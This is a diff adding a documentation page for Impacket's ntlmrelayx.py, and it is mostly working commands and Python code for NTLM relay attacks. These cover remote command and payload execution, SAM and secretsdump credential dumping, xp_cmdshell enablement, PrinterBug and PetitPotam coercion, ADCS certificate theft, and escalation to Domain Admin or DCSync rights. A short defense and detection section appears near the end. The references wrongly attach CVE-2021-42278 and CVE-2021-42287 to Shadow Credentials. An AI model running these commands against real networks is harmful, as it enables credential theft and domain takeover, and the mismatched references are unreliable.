@@ -1,0 +1,459 @@
+---
+title: 'NTLM Relay Attacks'
+description: 'Performing NTLM relay attacks with ntlmrelayx'
+---
+
+## Overview
+
+NTLM relay attacks allow an attacker to intercept NTLM authentication attempts and relay them to other services, gaining unauthorized access. Impacket's `ntlmrelayx.py` is a comprehensive tool for performing these attacks.
+
+**Location**: `examples/ntlmrelayx.py`
+
+## How NTLM Relay Works
+
+1. **Victim** attempts to authenticate to attacker-controlled server
+2. **Attacker** captures NTLM authentication without completing it
+3. **Attacker** relays authentication to target server
+4. **Target** accepts authentication from victim's credentials
+5. **Attacker** executes commands with victim's privileges
+
+## Basic Usage
+
+### Simple SMB Relay
+
+```bash
+# Relay SMB authentication to target
+ntlmrelayx.py -t smb://192.168.1.50 -smb2support
+
+# Relay to multiple targets from file
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Relay with command execution
+ntlmrelayx.py -t smb://192.168.1.50 -c "whoami"
+
+# Dump SAM hashes
+ntlmrelayx.py -t smb://192.168.1.50 -smb2support
+```
+
+### LDAP Relay
+
+```bash
+# Relay to LDAP for privilege escalation
+ntlmrelayx.py -t ldap://dc.domain.local -smb2support
+
+# Relay to LDAPS (SSL)
+ntlmrelayx.py -t ldaps://dc.domain.local -smb2support
+
+# Add computer account
+ntlmrelayx.py -t ldap://dc.domain.local --add-computer
+
+# Escalate privileges via ACL
+ntlmrelayx.py -t ldap://dc.domain.local --escalate-user lowpriv
+
+# Delegate access
+ntlmrelayx.py -t ldap://dc.domain.local --delegate-access
+```
+
+## Protocol Support
+
+### Relay Servers (Listeners)
+
+ntlmrelayx can listen on multiple protocols:
+
+- **SMB** (TCP 445)
+- **HTTP/HTTPS** (TCP 80/443)
+- **LDAP** (TCP 389)
+- **MSSQL** (TCP 1433)
+- **IMAP/IMAPS** (TCP 143/993)
+- **SMTP** (TCP 25/587)
+- **RPC** (TCP 135)
+- **WinRM** (TCP 5985/5986)
+
+```bash
+# HTTP to SMB relay
+ntlmrelayx.py -t smb://192.168.1.50
+
+# SMB to LDAP relay
+ntlmrelayx.py -t ldap://dc.domain.local -smb2support
+
+# Multi-protocol listener
+ntlmrelayx.py -t smb://192.168.1.50 -smb2support -http-port 8080
+```
+
+### Relay Clients (Targets)
+
+Relay authentication to:
+
+- **SMB**: File shares, admin access
+- **LDAP/LDAPS**: Directory services, privilege escalation
+- **HTTP/HTTPS**: Web applications, APIs
+- **MSSQL**: Database access
+- **RPC**: Remote procedure calls
+- **SMTP**: Email relay
+- **IMAP**: Email access
+
+## Attack Techniques
+
+### 1. SMB Relay for Code Execution
+
+```bash
+# Execute command on target
+ntlmrelayx.py -t smb://192.168.1.50 -c "powershell -enc <base64>"
+
+# Upload and execute payload
+ntlmrelayx.py -t smb://192.168.1.50 -e payload.exe
+
+# Interactive shell
+ntlmrelayx.py -t smb://192.168.1.50 -i
+# Then connect: nc 127.0.0.1 11000
+
+# Dump SAM database
+ntlmrelayx.py -t smb://192.168.1.50 -smb2support
+```
+
+### 2. LDAP Relay for Privilege Escalation
+
+```bash
+# Escalate user to Domain Admin
+ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user lowpriv
+
+# Add computer account (for RBCD)
+ntlmrelayx.py -t ldaps://dc.domain.local --add-computer EVILPC$ --add-computer-pass Password123
+
+# Configure RBCD on target
+ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access --escalate-user TARGETPC$
+
+# Shadow Credentials attack
+ntlmrelayx.py -t ldaps://dc.domain.local --shadow-credentials --shadow-target admin
+
+# Dump ADCS templates
+ntlmrelayx.py -t ldaps://dc.domain.local --dump-adcs
+```
+
+### 3. SOCKS Proxy Mode
+
+```bash
+# Start SOCKS proxy for relayed connections
+ntlmrelayx.py -tf targets.txt -socks -smb2support
+
+# View active connections
+ntlmrelayx> socks
+# Protocol  Target          Username           AdminStatus    Port
+# ------    ------          --------           -----------    ----
+# SMB       192.168.1.50    DOMAIN\victim      TRUE           60001
+# MSSQL     192.168.1.51    DOMAIN\dbadmin     TRUE           60002
+
+# Use proxychains to leverage connections
+proxychains smbexec.py DOMAIN/victim@192.168.1.50
+proxychains secretsdump.py DOMAIN/victim@192.168.1.50
+```
+
+### 4. HTTP to SMB/LDAP Relay
+
+```bash
+# Coerce HTTP authentication (via Printer Bug, PetitPotam, etc.)
+ntlmrelayx.py -t ldaps://dc.domain.local -smb2support
+
+# Then trigger from victim:
+# printerbug.py attacker-ip victim-ip
+# or petitpotam.py attacker-ip victim-ip
+
+# Capture and relay NetNTLM
+```
+
+### 5. ADCS (Active Directory Certificate Services) Attack
+
+```bash
+# Relay to ADCS for certificate
+ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# Obtained certificate can be used for authentication
+```
+
+### 6. MSSQL Relay
+
+```bash
+# Relay to MSSQL server
+ntlmrelayx.py -t mssql://sql.domain.local -q "SELECT @@version"
+
+# Enable xp_cmdshell and execute
+ntlmrelayx.py -t mssql://sql.domain.local \
+  -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'"
+```
+
+## Configuration Options
+
+### Target Selection
+
+```bash
+# Single target
+-t smb://192.168.1.50
+
+# Multiple targets from file
+-tf targets.txt
+# Format: one target per line
+# smb://192.168.1.50
+# ldap://dc.domain.local
+# mssql://sql.domain.local
+
+# Target by protocol and IP
+-t ldaps://192.168.1.100
+```
+
+### Attack Options
+
+```bash
+# Command execution
+-c "command to execute"
+
+# Execute file
+-e /path/to/payload.exe
+
+# Interactive shell
+-i
+
+# SOCKS proxy
+-socks
+
+# Specific attack
+--escalate-user USERNAME
+--delegate-access
+--add-computer
+--shadow-credentials
+--dump-laps
+--dump-gmsa
+--dump-adcs
+```
+
+### Server Options
+
+```bash
+# SMB server
+-smb2support              # Enable SMB2/3
+--no-smb-server          # Disable SMB listener
+
+# HTTP server
+--no-http-server         # Disable HTTP listener
+-http-port 8080          # Custom HTTP port
+--serve-image /path      # Serve custom file
+
+# LDAP
+--no-ldap-server         # Disable LDAP listener
+
+# Multirelay
+--no-multirelay          # Disable multiple relay
+```
+
+### Output Options
+
+```bash
+# Output file for hashes
+-of hashes.txt
+
+# Verbosity
+-debug
+
+# Logging
+--logfile relay.log
+```
+
+## Programming with Relay Components
+
+### Custom Relay Server
+
+```python
+from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
+from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
+from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+
+# Configure relay
+config = NTLMRelayxConfig()
+config.setProtocolClients({'SMB': smbclient})
+config.setTargets(TargetsProcessor())
+config.setSMB2Support(True)
+config.setExeFile('payload.exe')
+
+# Start SMB relay server
+server = SMBRelayServer(config)
+server.start()
+```
+
+### Custom Attack Module
+
+```python
+from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
+
+class CustomSMBAttack(ProtocolAttack):
+    PLUGIN_NAMES = ["SMB"]
+    
+    def run(self):
+        """Execute custom attack"""
+        # Access SMB connection
+        smb_client = self.client
+        
+        # Enumerate shares
+        shares = smb_client.listShares()
+        for share in shares:
+            print(f"Share: {share['shi1_netname'][:-1]}")
+        
+        # Upload file
+        with open('payload.exe', 'rb') as f:
+            smb_client.putFile('C$', '/Windows/Temp/payload.exe', f.read)
+        
+        # Execute via service
+        from impacket.examples import serviceinstall
+        service = serviceinstall.ServiceInstall(smb_client, 'payload.exe')
+        service.install()
+        service.uninstall()
+```
+
+### Custom LDAP Attack
+
+```python
+from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
+import ldap3
+
+class CustomLDAPAttack(LDAPAttack):
+    def run(self):
+        """Custom LDAP attack"""
+        # Access LDAP connection
+        ldap_client = self.client
+        
+        # Search for users
+        ldap_client.search(
+            'DC=domain,DC=local',
+            '(&(objectClass=user)(adminCount=1))',
+            attributes=['sAMAccountName', 'memberOf']
+        )
+        
+        for entry in ldap_client.entries:
+            print(f"Admin user: {entry.sAMAccountName}")
+        
+        # Modify ACL for privilege escalation
+        from impacket.ldap import ldaptypes
+        from impacket.uuid import string_to_bin
+        
+        # Add DCSync rights
+        ace = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
+        ace['Mask'] = ldaptypes.ACCESS_MASK()
+        ace['Mask']['Mask'] = 0x00000100  # DS-Replication-Get-Changes
+        ace['ObjectType'] = string_to_bin('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')
+        ace['InheritedObjectType'] = string_to_bin('00000000-0000-0000-0000-000000000000')
+        ace['Sid'] = ldaptypes.LDAP_SID()
+        ace['Sid'].fromCanonical('S-1-5-21-...')  # Target user SID
+        
+        # Apply ACE to domain object
+        # ... (simplified)
+```
+
+## Defenses Against Relay Attacks
+
+### SMB Signing
+
+```bash
+# Check if SMB signing is required
+crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+
+# Relay will fail against targets requiring signing
+ntlmrelayx.py -tf targets.txt -smb2support
+# [*] Authenticating against smb://192.168.1.50 as DOMAIN/user SUCCEED
+# [-] Signing is required, cannot relay to this host
+```
+
+### LDAP Signing and Channel Binding
+
+LDAPS with channel binding prevents relay:
+
+```bash
+# Relay to LDAP (may work)
+ntlmrelayx.py -t ldap://dc.domain.local
+
+# Relay to LDAPS (blocked by channel binding)
+ntlmrelayx.py -t ldaps://dc.domain.local
+# [-] LDAP channel binding is enforced, cannot relay
+```
+
+### EPA (Extended Protection for Authentication)
+
+HTTP services with EPA enabled resist relay attacks.
+
+## Mitigation Recommendations
+
+1. **Enable SMB Signing**: Require signing on all systems
+2. **Disable NTLM**: Use Kerberos exclusively where possible
+3. **LDAP Signing**: Enforce LDAP signing and channel binding
+4. **Network Segmentation**: Prevent lateral relay opportunities
+5. **Monitor**: Detect NTLM authentication anomalies
+6. **Patch**: Apply patches for coercion vulnerabilities (PrinterBug, PetitPotam)
+
+## Detection
+
+Signs of relay attacks:
+
+- Multiple authentication attempts from single IP
+- NTLM authentication from unexpected sources
+- Privilege escalation without credential access
+- Anonymous SMB connections
+- Unusual LDAP modifications
+- Event IDs: 4624 (Logon), 4672 (Special Privileges), 4738 (User Account Changed)
+
+## Common Attack Chains
+
+### 1. Coerce + Relay + Escalate
+
+```bash
+# Terminal 1: Start relay
+ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user lowpriv
+
+# Terminal 2: Coerce authentication
+printerbug.py domain.local/user:pass@target attacker-ip
+# or
+petitpotam.py -u user -p pass attacker-ip target
+```
+
+### 2. SOCKS + Dump Secrets
+
+```bash
+# Start SOCKS relay
+ntlmrelayx.py -tf targets.txt -socks -smb2support
+
+# Wait for victim authentication
+# Check active sessions
+ntlmrelayx> socks
+
+# Dump secrets via SOCKS
+proxychains secretsdump.py -no-pass DOMAIN/victim@192.168.1.50
+```
+
+### 3. ADCS Certificate Theft
+
+```bash
+# Relay to ADCS
+ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# Coerce DC authentication
+petitpotam.py attacker-ip dc.domain.local
+
+# Obtain DC certificate
+# Use certificate for DCSync
+```
+
+## Best Practices
+
+1. **Test in lab first**: Relay attacks can disrupt production
+2. **Understand target security**: Check for signing requirements
+3. **Use SOCKS mode**: More flexible than direct relay
+4. **Combine with coercion**: PrinterBug, PetitPotam, DFSCoerce
+5. **Clean up**: Remove added computer accounts, reset ACLs
+6. **Document**: Keep records of compromised accounts
+
+## References
+
+- CVE-2019-1040: NTLM MIC bypass
+- CVE-2019-1019: NTLM session security bypass  
+- PetitPotam (CVE-2021-36942)
+- PrinterBug (MS-RPRN RpcRemoteFindFirstPrinterChangeNotification)
+- Resource-Based Constrained Delegation (RBCD)
+- Shadow Credentials (CVE-2021-42278, CVE-2021-42287)
